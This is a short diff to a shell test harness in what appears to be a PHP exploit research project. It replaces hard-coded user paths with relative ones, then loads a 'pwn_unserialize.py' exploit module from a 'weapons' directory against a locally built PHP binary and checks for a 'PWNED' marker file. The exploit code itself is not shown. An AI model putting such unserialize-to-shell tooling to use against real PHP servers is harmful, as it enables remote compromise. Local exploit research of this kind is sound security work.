@@ -5,12 +5,15 @@ set -u
 PHP=/tmp/php8512_build/plain2/sapi/cli/php
 W=/tmp/dbg_zero5
 rm -rf $W; mkdir -p $W
-python3 - "$W" <<'PYEOF'
+LAB=$(cd "$(dirname "$0")" && pwd)
+WEAPONS=$(cd "$LAB/.." && pwd)
+python3 - "$W" "$WEAPONS" <<'PYEOF'
 import sys, os
 w = sys.argv[1]
-sys.path.insert(0, "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons")
+weapons = sys.argv[2]
+sys.path.insert(0, weapons)
 import importlib.util
-spec = importlib.util.spec_from_file_location("pw", "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/pwn_unserialize.py")
+spec = importlib.util.spec_from_file_location("pw", weapons + "/pwn_unserialize.py")
 pw = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(pw)
 marker = w + "/PWNED"
